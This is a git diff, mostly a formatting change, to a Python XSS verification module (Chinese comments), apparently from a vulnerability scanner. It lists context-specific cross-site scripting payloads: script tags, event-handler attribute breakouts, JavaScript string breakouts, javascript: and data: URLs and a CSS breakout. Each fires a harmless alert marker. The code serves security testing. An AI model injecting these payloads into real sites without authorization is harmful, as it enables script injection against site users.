@@ -7,6 +7,7 @@ XSS (Cross-Site Scripting) 验证模块
   - verify_xss_reflected: 反射型 XSS 验证
   - _analyze_context: XSS 上下文分析
 """
+
 import html
 import logging
 import re
@@ -186,67 +187,85 @@ class XSSVerifierMixin:
 
         for ctx in contexts:
             if ctx == "html_content":
-                payloads.extend([
-                    f"<script>alert('{unique_id}')</script>",
-                    f"<img src=x onerror=alert('{unique_id}')>",
-                    f"<svg onload=alert('{unique_id}')>",
-                    f"<body onload=alert('{unique_id}')>",
-                ])
+                payloads.extend(
+                    [
+                        f"<script>alert('{unique_id}')</script>",
+                        f"<img src=x onerror=alert('{unique_id}')>",
+                        f"<svg onload=alert('{unique_id}')>",
+                        f"<body onload=alert('{unique_id}')>",
+                    ]
+                )
             elif ctx == "attr_double_quote":
-                payloads.extend([
-                    f'" onmouseover="alert(\'{unique_id}\')" x="',
-                    f'" onfocus="alert(\'{unique_id}\')" autofocus="',
-                    f'"><script>alert(\'{unique_id}\')</script><"',
-                ])
+                payloads.extend(
+                    [
+                        f'" onmouseover="alert(\'{unique_id}\')" x="',
+                        f'" onfocus="alert(\'{unique_id}\')" autofocus="',
+                        f"\"><script>alert('{unique_id}')</script><\"",
+                    ]
+                )
             elif ctx == "attr_single_quote":
-                payloads.extend([
-                    f"' onmouseover='alert(\"{unique_id}\")' x='",
-                    f"' onfocus='alert(\"{unique_id}\")' autofocus='",
-                    f"'><script>alert('{unique_id}')</script><'",
-                ])
+                payloads.extend(
+                    [
+                        f"' onmouseover='alert(\"{unique_id}\")' x='",
+                        f"' onfocus='alert(\"{unique_id}\")' autofocus='",
+                        f"'><script>alert('{unique_id}')</script><'",
+                    ]
+                )
             elif ctx == "attr_unquoted":
-                payloads.extend([
-                    f" onmouseover=alert('{unique_id}') ",
-                    f" onfocus=alert('{unique_id}') autofocus ",
-                ])
+                payloads.extend(
+                    [
+                        f" onmouseover=alert('{unique_id}') ",
+                        f" onfocus=alert('{unique_id}') autofocus ",
+                    ]
+                )
             elif ctx == "js_double_quote":
-                payloads.extend([
-                    f'";alert("{unique_id}");//',
-                    f'"-alert("{unique_id}")-"',
-                    f'";</script><script>alert("{unique_id}")</script><script>"',
-                ])
+                payloads.extend(
+                    [
+                        f'";alert("{unique_id}");//',
+                        f'"-alert("{unique_id}")-"',
+                        f'";</script><script>alert("{unique_id}")</script><script>"',
+                    ]
+                )
             elif ctx == "js_single_quote":
-                payloads.extend([
-                    f"';alert('{unique_id}');//",
-                    f"'-alert('{unique_id}')-'",
-                    f"';</script><script>alert('{unique_id}')</script><script>'",
-                ])
+                payloads.extend(
+                    [
+                        f"';alert('{unique_id}');//",
+                        f"'-alert('{unique_id}')-'",
+                        f"';</script><script>alert('{unique_id}')</script><script>'",
+                    ]
+                )
             elif ctx == "js_template":
-                payloads.extend([
-                    f"${{alert('{unique_id}')}}",
-                    f"`-alert('{unique_id}')-`",
-                ])
+                payloads.extend(
+                    [
+                        f"${{alert('{unique_id}')}}",
+                        f"`-alert('{unique_id}')-`",
+                    ]
+                )
             elif ctx == "url_context":
-                payloads.extend([
-                    f"javascript:alert('{unique_id}')",
-                    f"data:text/html,<script>alert('{unique_id}')</script>",
-                ])
+                payloads.extend(
+                    [
+                        f"javascript:alert('{unique_id}')",
+                        f"data:text/html,<script>alert('{unique_id}')</script>",
+                    ]
+                )
             elif ctx == "css_context":
-                payloads.extend([
-                    f"}}</style><script>alert('{unique_id}')</script><style>",
-                ])
+                payloads.extend(
+                    [
+                        f"}}</style><script>alert('{unique_id}')</script><style>",
+                    ]
+                )
             else:
                 # 通用 payload
-                payloads.extend([
-                    f"<script>alert('{unique_id}')</script>",
-                    f"<img src=x onerror=alert('{unique_id}')>",
-                ])
+                payloads.extend(
+                    [
+                        f"<script>alert('{unique_id}')</script>",
+                        f"<img src=x onerror=alert('{unique_id}')>",
+                    ]
+                )
 
         return payloads
 
-    def _check_xss_payload(
-        self, response: str, payload: str, unique_id: str
-    ) -> Tuple[bool, str]:
+    def _check_xss_payload(self, response: str, payload: str, unique_id: str) -> Tuple[bool, str]:
         """检查 XSS payload 是否成功注入"""
         # 检查未编码的关键字符
         dangerous_patterns = [
